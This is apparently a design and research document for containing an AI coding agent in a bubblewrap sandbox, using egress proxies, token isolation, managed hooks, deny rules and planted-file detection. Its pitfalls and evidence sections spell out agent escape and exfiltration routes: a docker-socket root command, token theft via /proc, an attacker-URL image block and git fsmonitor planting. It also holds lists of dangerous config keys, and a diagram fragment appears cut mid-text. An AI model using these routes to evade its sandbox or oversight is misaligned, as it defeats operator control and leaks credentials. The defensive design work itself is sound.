### Network egress (SC1, LNCH-09)
- **D-02:** bwrap gains `--unshare-net --unshare-ipc --unshare-uts --hostname <fixed>`.
  - Verified working unprivileged on this host despite the AppArmor userns restriction.
  - Inside, only `lo` exists.
  - 127.0.0.1:8787 (claudear), LAN 192.168.x, 1.1.1.1, the docker bridge nets and `@/tmp/.X11-unix/X0`
    are all unreachable (refused or unreachable); all are reachable today.
  - SysV shm segments go from 1 to 0.
- **D-03 (new channel B6):** `--tmpfs /run` is added after `--ro-bind / /`, and before the
  `$XDG_RUNTIME_DIR` tmpfs and the driverctl socket re-bind.
  - Evidence: with `--unshare-net` alone, `/run/docker.sock` still works from inside. The user is in
    the docker group, and `GET /info` returned 200. That is root-equivalent and beats every other
    control (`docker run --network host -v /:/host`).
  - Also reachable: the system D-Bus, snapd, `/run/ssh-unix-local/socket` (mode 666), systemd
    varlink, cups, avahi and pcscd.
  - `/var/run` is a symlink to `/run`, so the tmpfs covers both. claude ran normally with it.
  - A live test asserts that `find / -xdev -type s` inside lists only the driverctl socket and the
    egress bridge. `[inferred — audit]` for the exact assertion form.
  - Abstract sockets are handled by D-02.
  - Not copied from sandbox-runtime: its seccomp blanket AF_UNIX ban, because it would break the
    driverctl hook shim. Filesystem hiding is precise here because `/`, `/run`, `/tmp`, `$HOME` and the
    runtime dir are all covered.
- **D-04: Inference goes through a token-injecting reverse proxy; the run token never enters the
  sandbox.** `[inferred — audit]`
  - The launcher serves a plain-HTTP reverse proxy for `api.anthropic.com` on a unix socket.
  - Inside, `ANTHROPIC_BASE_URL=http://127.0.0.1:<port>` and `CLAUDE_CODE_OAUTH_TOKEN` is a fixed dummy
    (`sk-ant-oat01-DUMMY…`).
  - The proxy drops inbound `authorization` / `x-api-key` headers, injects the real token, and forwards
    over TLS.
  - Why: the token probe showed `CLAUDE_CODE_OAUTH_TOKEN` is readable inside via
    `/proc/<claude pid>/environ` (same uid, same pid namespace). The driver could lift it and `curl` the
    account APIs, which beats every client-side gate and deny rule.
  - Measured: `claude -p` works on the dummy (`POST /v1/messages?beta=true → 200`); no refresh attempt;
    no platform.claude.com traffic.
  - Supersedes Phase 28 D-19's "token passed in the environment" for bwrap-scope runs. Degraded runs
    keep the env token and record its absence as a missing protection (D-27).
  - **Reversibility:** costly. The auth path, env contract and acceptance harness all change.
- **D-05: Path allowlist plus body check on the reverse proxy.** `[inferred — audit]`
  - Only `POST /v1/messages` and `/v1/messages/count_tokens` (any query string) are forwarded; anything
    else gets a fast 403.
  - Measured: with the full-scope host token injected and no filter, `GET /v1/code/sessions` returned
    200. With the filter, `/v1/code/sessions`, `/v1/code/triggers`, `/v1/mcp_servers` and
    `/v1/environments/bridge` all returned 403.
  - The proxy also parses the JSON body and refuses a request that carries an `mcp_servers` field or a
    server-side tool other than `web_search`, such as `web_fetch` or code execution. Without that check,
    a `/v1/messages` call could ask Anthropic's servers to reach out. This check is UNVERIFIED in live
    traffic; research must confirm the field and tool-type names against the current API and the
    traffic claude actually sends.
  - Supports Content-Length and chunked bodies.
  - The log records method, path, status and request count only, never headers, under the run's data
    dir.
- **D-06: CONNECT proxy for everything else, deny by default.**
  - The launcher serves an HTTP CONNECT proxy. Port 443 only. Every request is logged.
  - Allows only hosts from the run's egress allowlist.
  - Applies a resolved-address guard: an allowlisted name that resolves to a loopback, link-local or
    private address is refused (sandbox-runtime prior art, DNS rebinding).
  - CONNECT to `api.anthropic.com` is DENIED, so all inference goes through D-04/D-05. Measured: once
    `skipWebFetchPreflight` is set, nothing needs a direct CONNECT to it. The only remaining attempts
    (the WebFetch preflight and RemoteTrigger org lookups) are exactly what must be blocked.
  - Inside: `HTTPS_PROXY` / `https_proxy` / `HTTP_PROXY` / `http_proxy` point at the bridge, and
    `NO_PROXY=127.0.0.1,localhost`.
  - Claude Code has no SOCKS support; HTTP CONNECT is the only option (docs).
- **D-07: Package and git hosts come from an operator-configurable allowlist, default empty. Offline
  vendoring is deferred.** `[inferred — audit]`
  - Named presets the operator opts into per project:
    - `rust`: `index.crates.io`, `static.crates.io`, `crates.io`;
    - `github-read`: `github.com`, `codeload.github.com`, `objects.githubusercontent.com`;
    - `npm`: `registry.npmjs.org`;
    - `python`: `pypi.org`, `files.pythonhosted.org`;
    - plus free-form extra hosts.
  - Stored in gsd-mm's config per project (exact key is the planner's call, under the existing
    `driver.*` table).
  - The active list is recorded on the run as an additive frontmatter key (`egress_allow: [...]`) and
    shown with the posture.
  - Rationale:
    - The driven project can be any GSD project, so vendoring is per-ecosystem work and breaks new
      dependencies mid-run.
    - A fixed broad allowlist adds ingress and exfil surface for runs that don't need it.
    - None of these hosts gives more capability without credentials: anonymous gist/API writes fail,
      and D-10/D-12 keep credentials out.
  - Residual: allowlisted hosts are prompt-injection ingress and a low-bandwidth exfil path. That goes
    in the residual-risk doc (D-26).
- **D-08: In-sandbox bridge is a hidden `gsd-meta-manager bridge <listen-port> <unix-sock>`
  subcommand.**
  - Started inside bwrap before claude (a small wrapper as the bwrap command, or the bridge
    double-forks and execs claude; planner's call).
  - No socat dependency (socat is not installed here, and sandbox-runtime needs it) and no python.
  - One TCP listener can serve both proxies, or two ports, one per proxy; planner's call.
  - The binary is already ro-bound via the `current_exe()` bind (D-11).
- **D-09: The proxies run in-process in the launcher on tokio, one pair per run.**
  - Sockets live under `$XDG_RUNTIME_DIR` with short names (`gsdmm-egress-<hash8>.sock`), because
    `sun_path` is limited to 108 bytes and the prototype hit `AF_UNIX path too long` from a deep path.
  - Re-bound into the runtime-dir tmpfs like the driverctl socket.
  - The launcher already owns the run's lifetime (Phase 28 D-04), so no new daemon is needed.
- **D-09a: Environment additions inside:**
  - `DISABLE_TELEMETRY=1`, `DISABLE_ERROR_REPORTING=1`, `DISABLE_AUTOUPDATER=1`,
    `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`, `ENABLE_CLAUDEAI_MCP_SERVERS=false`;
  - strip `TMUX` and `TMUX_PANE` (claude tried `/tmp/tmux-1000/default` because `TMUX` leaked);
  - per-run `settings.json` gets `"skipWebFetchPreflight": true` and `"disableClaudeAiConnectors": true`.
  - Measured: with these set, a headless run contacts only `api.anthropic.com`, and `example.com` is
    refused by the proxy.

### Auth posture (SC4, LNCH-12)
- **D-10: Setup-token preferred; host-token fallback kept but recorded.** `[inferred — audit]`
  - Evidence:
    - The bundle's setup-token flow calls
      `startOAuthFlow({inferenceOnly:true, expiresIn:31536000})` and requests only `user:inference`.
    - The host login token carries `user:file_upload user:inference user:mcp_servers user:plugins
      user:profile user:sessions:claude_code`.
    - This host has no stored setup-token, so every launch today uses the full-scope host token.
  - With D-04/D-05 the token never enters the sandbox, and only `/v1/messages` reaches the API, so
    even the host token is path-confined.
  - The fallback stays (Phase 28 D-22/D-23) but is recorded as posture `auth: host-token` vs
    `setup-token` (additive key) and shown in the TUI. The Driver tab tells the operator to run
    `driver auth setup` to shrink the server-side scope.
  - Refusing the fallback outright was rejected. It would make every launch on this host fail today,
    and D-04/D-05 already contain it.
- **D-11: SC4 probe.**
  - A committed probe (opt-in live test plus script) runs from inside the sandbox with the stored token.
  - It deliberately bypasses the proxy filter: a direct `curl` with the token on the host side of a test
    harness, and a forged `CLAUDE_CODE_OAUTH_SCOPES` to defeat client gates. Read-only requests:
    - `GET /v1/mcp_servers?limit=1`;
    - `GET /v1/code/triggers`;
    - `GET /v1/code/sessions`;
    - the Remote Control eligibility/profile check.
  - It records the status codes.
  - Positive control: the host token, already measured 200 for sessions and connector listing.
  - **Human prerequisite:** minting a setup-token needs browser OAuth (`driver auth setup`). It is the
    only part of this phase an agent cannot do. If no stored token exists at verify time, the probe
    records `NOT-RUN: no setup-token` and SC4's "settled by evidence" rests on:
    - the static bundle evidence above;
    - the measured fact that D-05 refuses those paths regardless of token scope.
  - Flag that as the single human UAT item.

### Agent-to-agent tools and the nested-claude gap (SC4, SC5, LNCH-12/13)
- **D-12: Gate policy moves into a managed-settings file bound at `/etc/claude-code/`.**
  - Why: a nested `claude` with a different `CLAUDE_CONFIG_DIR` fired no gate hooks, and with
    `--settings <file>` it fired only that file's hooks.
  - Measured mechanism: `--overlay-src /etc --tmp-overlay /etc` then
    `--ro-bind <per-run managed dir> /etc/claude-code`.
  - Managed PreToolUse hooks then fired under every bypass tried:
    - `--setting-sources user|project`;
    - a foreign `CLAUDE_CONFIG_DIR`;
    - `disableAllHooks:true` in user settings or `--settings`;
    - `CLAUDE_CODE_MANAGED_SETTINGS_PATH` pointed elsewhere;
    - `--bare` with an `apiKeyHelper` (only SessionStart is skipped under `--bare`).
  - What moves out of the per-run `settings.json` into the managed file:
    - the gate's PreToolUse / PostToolUse / Stop entries (moved, never duplicated, so nothing is
      double-counted);
    - the deny rules (D-13).
  - The driverctl socket path is baked into the hook command line, so unsetting `DRIVERCTL_SOCK` can't
    escape. `onFailure: block` stays.
  - If the host has its own `/etc/claude-code/*`, its contents are merged into the per-run file, never
    hidden. The admin's policy stays in force.
  - **Reversibility:** costly. Gate wiring, golden tests and the acceptance harness move.
    `[inferred — audit]`
- **D-13: Deny rules** in the managed file's `permissions.deny`:
  - `Cron*`, `RemoteTrigger`, `SendMessage`, `ListAgents`, `ScheduleWakeup`, `DesignSync`,
    `mcp__claude_ai_*`.
  - Verified live under `--permission-mode bypassPermissions`:
    - deny rules hold;
    - the trailing `*` wildcard matches all three Cron tools;
    - `mcp__claude_ai_*` removes every connector tool;
    - a forced call returns "No such tool available".
  - `DesignSync` is denied on the inferred grounds that it is a cloud design feature with unanalysed
    reach `[inferred — audit]`.
  - `Workflow`, `Task`, `Agent` and `Monitor` stay allowed: they stay inside the cage and are counted
    by the gate.
  - Defence in depth on top of D-04/D-05, which are the real control.
- **D-14: A5 closes as follows:**
  - Hook-counted caps now see nested claudes (D-12).
  - Residual: raw API calls via the proxy with no tool use are invisible to hooks. They are bounded by:
    - the monitor's active-seconds cap;
    - `RuntimeMaxSec`;
    - `MemoryMax=6G` / `TasksMax=1024`;
    - the reverse proxy's request log.
  - The proxy counts `/v1/messages` requests per run and records the total on the run (additive key) so
    the operator can see out-of-hook usage. A request-count cap is NOT added. That would be new scope;
    see Deferred.
- **D-15: bwrap version floor.**
  - `--overlay-src` / `--tmp-overlay` need bwrap ≥ 0.10, and overlayfs in a user namespace needs kernel
    support (present here). Ubuntu 24.04 ships an older bwrap (UNVERIFIED version).
  - The launcher feature-detects (`bwrap --version` plus a dry probe).
  - When overlay is unavailable, the run proceeds and records `managed-settings` and `registry-overlay`
    as absent protections (D-27). The gate hooks stay in the per-run `settings.json` as in Phase 28, and
    the cargo registry is bound ro.
  - Research checks whether `--tmpfs /etc` plus per-entry ro re-binds is a viable fallback for old bwrap
    and adopts it if cheap.
  - CI is unaffected: argv builders are pure, live tests are opt-in.

### Planted-file guard (SC3, LNCH-11)
- **D-21: Per-path choice** (from bwrap and git experiments):

  | Path | Inside the sandbox | After the run |
  |---|---|---|
  | `.git/config`, `.git/hooks/` | ro-bind (when present) with `.git` itself self-bound so it cannot be renamed | hash + flag |
  | `.claude/settings.json`, `.claude/settings.local.json`, `.claude/{hooks,agents,commands}/` | ro-bind if present, with `.claude` self-bound | hash + flag (for paths that were absent) |
  | `.claude/skills/`, `CLAUDE.md` | rw (GSD writes them: `sketch-wrap-up`, quick tasks, `generate-claude-md`) | hash + flag |
  | `.claude/` as a whole | rw (harness worktrees live in `.claude/worktrees/`) | — |
  | `.envrc`, `.vscode/tasks.json`, `.mcp.json`, `.gitattributes`, `.git/info/attributes` | rw | hash + flag |
  | `.git/worktrees/*/{commondir,gitdir}`, worktree `.git` files, any new nested `.git` | rw (a ro-bind cannot close this class) | detect + flag |

  Evidence that drove each row:
  - **Parent rename:** a ro-bound file resists write, rename, unlink and replace (EBUSY). Its parent
    directory can still be renamed: `mv .git .gitx` succeeded with `.git/config` ro-bound. Hence the
    ancestor self-binds.
  - **Missing paths:** placeholders for missing paths leave 0-byte junk on the host, and
    `--ro-bind-try` silently skips. Hence detect-only for absent paths.
  - **Git with `.git/config` ro-bound** (strace + sha):
    - `commit`, `branch`, `checkout -b`, `worktree add`/`remove`, `merge`, `gc` and `fetch` never
      write it;
    - `branch -D` warns and exits 0;
    - `branch -m` exits 128 after renaming.
  - **Confirmed bypasses:**
    - rewriting a worktree's `commondir` to an attacker config with `core.fsmonitor` ran on a host
      `git status`;
    - a new nested `sub/.git/config` did the same.

  `[inferred — audit]` for the table as a whole.
- **D-22: Detection.**
  - Before launch, the launcher snapshots the hashes of every row above (plus a listing of `.git` dirs
    and files and worktree pointers).
  - After every launch it re-scans:
    - hash diffs;
    - new or changed nested `.git` and worktree pointers outside the known worktrees;
    - every git config found, grepped for `fsmonitor|hooksPath|sshCommand|pager|editor|alias|filter\.|textconv|credential|include`.
  - Findings are recorded on the run (additive frontmatter key `planted: [...]`, plus LOG lines) and
    shown on the Driver tab in the warning style.
  - Files are never reverted automatically, in line with the non-intrusive constraint.
- **D-23: The push step refuses on git-relevant planted findings.**
  - The Phase 28 push runs git on the host, in the project. A planted `core.fsmonitor`, hook, filter or
    worktree pointer would execute there.
  - The push therefore:
    - runs detection first;
    - parks with a typed reason when any finding touches git config, hooks, attributes or worktree
      pointers;
    - additionally hardens its own git invocations with `-c core.fsmonitor=false` (plus the existing
      `core.hooksPath=/dev/null`), and the other config-exec keys where git allows overriding them.
  - The operator clears the park explicitly (re-run `driver push` with an ack flag after inspecting).
  - `[inferred — audit]` for the ack mechanism's shape.

## Summary

The phase is buildable as decided, with three corrections that come from evidence gathered this session and one widening of the body check.

First, the overlay options need **bubblewrap 0.11.0**, not 0.10 (`--overlay`, `--tmp-overlay`, `--ro-overlay` and `--overlay-src` were added in 0.11.0, released 2024-10-30), and the Ubuntu 24.04 CI-runner image ships **bubblewrap 0.9.0** (`0.9.0-1ubuntu0.3`, measured with `apt-cache policy` in an `ubuntu:24.04` container). The D-15 fallback the discuss step asked research to check works: `--tmpfs /etc`, then `--ro-bind-try` / `--symlink` for each host `/etc` entry, then `--ro-bind <managed dir> /etc/claude-code`, then `--remount-ro /etc`. Every one of those options exists in 0.9.0 (checked in `bwrap --help` on 24.04). On this host the managed PreToolUse hook fired under that fallback, inside the full proposed profile (net/ipc/uts unshared, `/run` tmpfs, reverse proxy, dummy token). It costs about 0.3 s per launch (5 launches: 1.47 s vs 0.06 s with overlay). So **`managed-settings` is never absent on a Linux bwrap run**. Only the cargo-registry overlay depends on 0.11, and an old-bwrap run lists only `registry-overlay`.

Second, the request shape is settled empirically. In three sandboxed `claude -p` runs (Bash tool, WebSearch, WebFetch plus an Agent subagent) Claude Code 2.1.310 sent **only `POST /v1/messages?beta=true`**. It authenticated with `authorization: Bearer <dummy>` plus `anthropic-beta: oauth-2025-04-20,…` and sent no `x-api-key`. It used Content-Length (no chunked, no `content-encoding`) and posted ~43 KB bodies. The top-level keys were `context_management, max_tokens, messages, metadata, model, output_config, stream, system, thinking, tools`. Its tools are client tools with no `type` field. The single server tool it ever sent was **`web_search_20250305`**, in a separate sub-request carrying `tool_choice: {"type":"auto"}`. WebFetch is client-side: it went to `CONNECT example.com:443`, which was denied. `ToolSearch` is client-side as well (it returned a `tool_reference` block). A tool-type **allowlist** therefore fits exactly what Claude Code sends: no `type`, `"custom"`, or a `web_search_` prefix. The documented server-tool family keeps growing (`web_fetch_20260318`, `advisor_20260301`, `code_execution_20260521` and others), so a denylist would miss new members. The body check must **also** reject `image`/`document` blocks whose `source.type` is `url` or `file`. The Messages API fetches `url` sources server-side, which is the same "ask Anthropic's servers to reach out" channel D-05 targets but through `messages[]` rather than `tools[]`.

Third, two test and detection designs in CONTEXT would pass vacuously or would execute attacker code. `find / -xdev -type s` stops at every tmpfs mount point, so it never sees the runtime-dir sockets the assertion is about. And post-run detection must parse files directly rather than run `git` in the checkout. The push step's existing `git --git-dir <mirror> fetch <checkout>` runs `upload-pack` inside the driver-controlled repository, so detection has to gate the fetch, not just the push.

**Primary recommendation:** build one launcher-side egress server per run (a tokio current-thread runtime on a dedicated thread, matching D-09 and the `driverctl/serve.rs` precedent). It listens on one unix socket and dispatches on the request-target form: authority-form `CONNECT` goes to the allowlist tunnel, origin-form goes to the inference reverse proxy, and anything else gets a 403. Put the policy decisions in pure functions with golden tests. Use rustls (ring provider) + tokio-rustls + webpki-roots + httparse, not hyper. In the sandbox, use the tmpfs-`/etc` re-bind for managed settings on every bwrap version.

**Prescriptive body policy** (fail closed; refusal → 403 with an Anthropic-shaped error body):
1. Method `POST`. Path (before `?`) is exactly `/v1/messages` or `/v1/messages/count_tokens`. Query forwarded verbatim (D-05: any query string). Request-target must be origin-form (starts with `/`); absolute-form (`GET http://x/…`, which is what `HTTP_PROXY` users send) → 403.
2. Reject `content-encoding` other than absent/`identity`, `upgrade`, `expect` other than `100-continue` (answer `100 Continue` yourself), both CL and TE, a CL over 32 MiB, and malformed JSON (including serde's recursion-limit error).
3. Top-level `mcp_servers` present (any value, even `[]`) → deny. `container` present and not `null` → deny.
4. `tools[]`: allow an entry iff `type` is absent, or `"custom"`, or starts with `"web_search_"`. Anything else → deny, naming the type in the log (the type string is policy data, not a secret).
5. Recursive walk of the whole body: any object whose `source` is an object with `type` ∈ {`url`, `file`} → deny. Any block `type` ∈ {`container_upload`, `mcp_tool_use`, `mcp_tool_result`} → deny. `search_result.source` is a plain string (citation metadata) and is not affected `[inferred — audit]`.
6. Headers to upstream: drop `authorization`, `x-api-key`, `cookie`, `host`, `connection`, `proxy-*`, `keep-alive`, `te`, `trailer`, `upgrade`, `transfer-encoding`, `content-length`, `expect`. Set `Host: api.anthropic.com`, `Authorization: Bearer <token>`, `Content-Length: <buffered len>`, `Connection: close`. Pass `anthropic-*`, `x-stainless-*`, `x-app`, `user-agent`, `accept*`, `content-type` through. The Bearer header plus the client's own `oauth-2025-04-20` beta is what the prototype did, and it returned 200.

   │                          ─► api.anthropic.com:443 ─► pump response bytes back until EOF ; count++
   └─ anything else (absolute-form, other paths/methods, Upgrade) ─► 403 + log
 after the claude child exits: stop the egress thread; record inference_requests;
 post-run planted scan (file reads + sha2, NO git) ─► planted: [...] ─► push gates on git-relevant findings
```

### Pattern 1: One socket, dispatch on request-target form
**What:** a single launcher-side unix socket and a single in-sandbox port. `CONNECT` with an authority-form target means the tunnel; an origin-form target (`/…`) means the inference proxy; an absolute-form or asterisk target, or anything else, gets a 403. This answers the D-08 "one or two ports" choice `[inferred — audit]`.
**Why:** one bind, one bridge listener, one log, one lifetime. The prototype `rproxy.py` already served both roles on one socket (denying CONNECT). The pitfall it had: it stripped `^https?://[^/]+` from any target, so an absolute-form `GET http://evil/v1/messages` (which is how `HTTP_PROXY` users send plain HTTP) was forwarded to Anthropic **with the token**. Rejecting absolute-form outright closes that.

### Pattern 2: Pure policy, thin I/O
Every decision is a pure function over parsed data, unit-tested in CI with no network, like `bwrap_argv`. I/O modules only call them. The upstream connector is a parameter (TLS in production, a plain-TCP fake server in tests), so the full proxy loop is testable in CI with an in-process stub of `api.anthropic.com`.

### Pattern 3: Resolved-address guard (DNS-rebinding defence)
Resolve once (`tokio::net::lookup_host((host, 443))`), drop every denied address, connect to a survivor (never re-resolve), refuse when none survive. Never accept IP literals in CONNECT (the allowlist is names only). Denied classes per D-06 plus sandbox-runtime's list: loopback, unspecified (`0.0.0.0/8`, `::`), link-local (`169.254/16`, `fe80::/10`), multicast, broadcast, RFC 1918, CGNAT `100.64.0.0/10`, ULA `fc00::/7`, cloud metadata singletons (`100.100.100.200`, `168.63.129.16`, `192.0.0.192`, `fd00:ec2::/32`, …), and every IPv6 form that carries an IPv4 address (mapped `::ffff:0:0/96`, NAT64 `64:ff9b::/96`, 6to4 `2002::/16`), checked as that IPv4 address [CITED: anthropic-experimental/sandbox-runtime 0.0.81 `dist/sandbox/resolved-address-guard.js`, downloaded tarball]. Refusal messages name the class, never the address (the same rule as sandbox-runtime).

### Pattern 4: The bridge wrapper (sequencing)
`bwrap … -- <exe> bridge --port 3128 --sock <egress.sock> -- claude -p …`. The bridge binds `std::net::TcpListener` on `127.0.0.1:3128` **first** (readiness is guaranteed, because connects queue in the backlog), spawns the accept loop on threads, spawns `claude` as a child that inherits stdio (stream-json stdout still lands in `launch-N.jsonl`), waits, and exits with the child's code (128+signal on signal). There is no fork, no exec of claude over the bridge, and no libc (the crate's no-libc posture). Stop semantics are unchanged: `systemctl --user stop` signals the whole scope cgroup, and the pid namespace dies with bwrap's init. Rust std sets `CLOEXEC` on the listener, so claude does not inherit it. **The `Command::new` for claude must live in `src/launcher/process.rs`**: `tests/spawn_seam_guard.rs` allowlists exactly one launcher spawn file. The port is a fixed constant: the network namespace is private, so there is nothing to collide with, and the goldens stay deterministic `[inferred — audit]`.

### Pattern 5: bwrap argv order (the contract)
```
bwrap --ro-bind / / --dev /dev --proc /proc
      --tmpfs /tmp
      --tmpfs /etc  {--ro-bind-try /etc/X /etc/X | --symlink <target> /etc/X}…  (skip host /etc/claude-code)
      --ro-bind <cfg>/managed /etc/claude-code  --remount-ro /etc
      --tmpfs /run                                            (D-03; covers /var/run)
      --tmpfs $HOME  {--ro-bind[-try] <allowlisted>}…  [--overlay-src R --tmp-overlay R | --ro-bind R R]
      --tmpfs $HOME/.cache --tmpfs $HOME/.local/share/rtk   --ro-bind <cfg>/gitconfig $HOME/.gitconfig
      {--ro-bind /dev/null <null-mask>}…                      (second layer, only for existing files)
      --bind <project> <project>
      --bind <project>/.git <project>/.git  {--ro-bind .git/config, .git/hooks}   (when present)
      --bind <project>/.claude <project>/.claude  {--ro-bind settings*.json, hooks, agents, commands}
      --tmpfs <drivers dir>  --ro-bind <run dir>  lock masks
      --bind <config dir>  --ro-bind <config dir>/settings.json  --ro-bind <config dir>/bin
      --tmpfs $XDG_RUNTIME_DIR  --bind <driverctl.sock>  --bind <egress.sock>
      --unshare-pid --unshare-net --unshare-ipc --unshare-uts --hostname gsdmm-sandbox
      --new-session --die-with-parent --chdir <project> -- <exe> bridge … -- claude …
```
Notes: `$HOME` binds precede the project, config-dir and socket binds, because all of those live under `$HOME` (`dirs::data_local_dir()`). `--tmpfs /run` precedes the runtime-dir tmpfs. `/etc` entries use `--ro-bind-try` so an entry deleted between the listing and the exec does not abort the launch `[inferred — audit]`. The `/etc` listing is a `SandboxSpec` input gathered in `from_host`, so `bwrap_argv` stays pure.

### Pattern 6: Managed settings content
Written per launch to `<config_dir>/managed/managed-settings.json`, ro-bound at `/etc/claude-code`. It carries the gate's hook entries (moved out of `settings.json`, never duplicated), with the shim invoked so that the socket path is baked into the shim (simplest: the ro `bin/driverctl` shim script sets `DRIVERCTL_SOCK='<path>'` before `exec`, so both managed hooks and in-driver `driverctl` calls are pinned) `[inferred — audit]`. It also carries `permissions.deny` (D-13), plus `skipWebFetchPreflight: true`, `disableClaudeAiConnectors: true`, and the cheap locks `enableArtifact: false`, `disableRemoteControl: true`, `crossSessionInbound: "refuse"` (all documented "any file" keys; the last is a lock that "applies the strictest value any source sets") [CITED: code.claude.com/docs/en/settings, settings-reference index, managed-settings]. Do **not** set `allowManagedHooksOnly` (it would unload the GSD/rtk user hooks D-16 keeps). Host policy: merge host `/etc/claude-code/managed-settings.json` **and** `managed-settings.d/*.json` (the drop-in dir is read too [CITED: managed-settings]), concatenating lists and keeping the host's stricter scalar. A host managed file that fails to parse must refuse the launch, mirroring Claude Code, which "refuses to start" on an unparseable managed file [CITED: managed-settings] `[inferred — audit]`.

### Pattern 7: Planted-file detection without executing the repo
Snapshot and re-scan by **reading files** (`sha2` over the bytes, a `symlink_metadata` listing of `.git` entries, parsing gitdir/commondir pointer files, `objects/info/alternates`). Never shell out to `git` in the checkout during detection. Config scan: parse every git config file found (the checkout's `.git/config`, `.git/worktrees/*/config.worktree`, the targets of `commondir`, nested `**/.git/config`, any `include.path`/`includeIf` target) and flag keys matching the D-22 list **plus** `core.worktree`, `core.gitProxy`, `core.askPass`, `core.alternateRefsCommand`, `gpg.program`, `gpg.*.program`, `uploadpack.*`, `receivepack`, `remote.*.uploadpack`, `remote.*.receivepack`, `merge.*.driver`, `diff.external`, `*.command`, `*.cmd`, `submodule.*.update`, `init.templateDir`, `http.proxy`, `extensions.worktreeConfig` `[ASSUMED: from git-config(1) knowledge, not re-read this session]`.

### Pattern 8: Additive posture keys
Follow the `sandbox`/`sandbox_missing` path exactly: a `LaunchSpec` field → `EXTRA_*` const in `src/driverctl/store.rs` (written per launch in `begin_launch`, values through `header_safe`) → `DriverFrontmatter` `Option<…>` with `#[serde(default)]`, emitted only when set. Post-launch facts (`planted`, `inference_requests`) go through the existing launcher-key writer at launch end. `RUN_STATE_FIELDS` refuses typed fields, so these must be new `extra` names.

### Anti-Patterns to Avoid
- **Trusting anything inside the sandbox for policy** (the bridge, env vars, `NO_PROXY`). The driver can kill the bridge or write raw HTTP to the unix socket; all checks happen outside.
- **A tool-type denylist.** New server tools appear monthly (`web_fetch_20260318`, `advisor_20260301` are recent); a denylist silently admits the next one.
- **Logging request headers or bodies.** D-05 forbids headers. The CONNECT authority and the denied tool-type string are the only request-derived data logged.
- **`find / -xdev -type s` as the socket sweep** (see Pitfall 8).
- **Running `git status`/`git diff` in the checkout from the launcher after a run** (fsmonitor/filter/textconv execute).

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| TLS client | anything custom | rustls + tokio-rustls + webpki-roots | Certificate validation and SNI |
| HTTP head parsing | a `split("\r\n")` parser (the prototype's) | httparse | Header folding, obs-text, length limits, partial reads |
| Address classification | string-prefix checks on IPs | `std::net::IpAddr` methods + explicit CIDR table | Embedded IPv4 in IPv6 forms; `Ipv4Addr::is_private`/`is_link_local`/`is_broadcast` exist on stable |
| Hashing planted files | a fast non-crypto hash | `sha2` (already a dependency) | Adversarial input; this repo's own C-4 rationale |
| Managed-settings mechanism | an env/argv pinning scheme | Claude Code managed tier at `/etc/claude-code` | Measured: survives foreign config dir, `--settings`, `disableAllHooks`, `--bare` |

**Key insight:** the proxy's correctness does not come from HTTP fidelity. It comes from never forwarding anything it did not fully parse and re-serialise. Buffer, decide, re-emit canonically, one request per connection.

## Common Pitfalls

### Pitfall 1: Server-side fetch via content blocks
**What goes wrong:** the body check covers `tools[]` and `mcp_servers` but a request carries `{"type":"image","source":{"type":"url","url":"https://attacker/?d=<secret>"}}`; Anthropic's servers fetch it. **Avoid:** recursive `source.type ∈ {url,file}` refusal (Q1 rule 5). **Detect:** a CI golden with a URL image nested inside a `tool_result`.

### Pitfall 2: Absolute-form requests forwarded with the token
**What goes wrong:** `HTTP_PROXY` clients send `GET http://host/path`; a prefix-stripping proxy (the prototype) forwards to Anthropic with the injected token. **Avoid:** origin-form only on the inference side.

### Pitfall 3: Compressed or framed bodies bypassing inspection
**What goes wrong:** a `Content-Encoding: gzip` body can't be inspected; CL+TE disagreement lets a second request ride along. **Avoid:** reject any non-identity encoding (also set `CLAUDE_CODE_GZIP_REQUEST_BODIES=0` inside, belt to braces); reject CL+TE together, duplicate CL, `Upgrade`; always re-serialise with your own CL and `Connection: close`.

### Pitfall 4: Host-token expiry mid-run
**What goes wrong:** the host access token is refused under 5 min of life (`auth.rs` `MIN_TOKEN_LIFETIME`) and expires during long runs; with the token now outside, every request 401s. **Avoid `[inferred — audit]`:** for `TokenSource::Host`, the proxy re-runs `host_access_token` on each request (a small file read; the host's own claude refreshes the file) and keeps the last good value; for `Stored` it is static. That is a robustness gain over Phase 28's env token.

### Pitfall 5: ALPN negotiating h2
**What goes wrong:** the upstream speaks HTTP/2 to a connector that writes HTTP/1.1. **Avoid:** set `alpn_protocols = [b"http/1.1"]` (or none) on the rustls `ClientConfig`.

### Pitfall 6: Unbounded hostile input
**What goes wrong:** the driver opens thousands of connections or sends endless headers. **Avoid:** head ≤ 64 KiB with a read timeout, body ≤ 32 MiB, a concurrent-connection cap (e.g. 64), and serde_json's default recursion limit as a deny `[inferred — audit]`.

### Pitfall 7: tmpfs and tmp-overlay RAM
**What goes wrong:** `--tmp-overlay` upper dirs and the `$HOME`/`.cache` tmpfs live in RAM and count against the scope's `MemoryMax=6G` (shmem is charged to the faulting cgroup `[ASSUMED]`); a big `cargo fetch` can OOM the run. **Avoid:** cap with bwrap `--size` on `$HOME`-side tmpfs mounts (0.9 has `--size`), and document it. **Warning sign:** scope OOM kills during dependency download.

### Pitfall 8: Vacuous socket sweep
**What goes wrong:** `find / -xdev -type s` does not descend into the `/run`, `$XDG_RUNTIME_DIR`, `/tmp` or `$HOME` tmpfs mounts (each is a different filesystem), so it can never see the driverctl/egress sockets and passes whatever leaks there. Measured: with the profile, both forms print nothing. **Avoid:** `find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type s -print`, and assert the result **equals** `{driverctl.sock, egress.sock}` (non-vacuity: those two must be present).

### Pitfall 9: Detection that runs the attacker's config
**What goes wrong:** the launcher calls `git status` to look for changes, and a planted `core.fsmonitor` runs on the host. **Avoid:** Pattern 7 (file reads only).

### Pitfall 10: The push's checkout fetch executes in the driver's repo
**What goes wrong:** `push.rs:515-526` runs `git --git-dir <mirror> fetch … <ctx.project> <refspec>`, which starts `upload-pack` in the checkout, a repository the driver controlled; a `.git` gitfile pointer redirects it to any repo the driver built. **Avoid:** D-23 detection must run and gate **before** this fetch (not just before `push`), and every launcher `git` call that names the checkout gains `-c core.fsmonitor=false -c core.hooksPath=/dev/null` `[inferred — audit]`.

### Pitfall 11: `.git` rename or replacement despite ro binds
**What goes wrong:** ro-binding `.git/config` alone does not stop `mv .git .gitx` (measured in discuss). **Avoid:** self-bind `.git` and `.claude` (a mount point cannot be renamed: EBUSY), and emit those binds only for paths that exist at launch.

### Pitfall 12: The host probe doesn't test what the profile uses
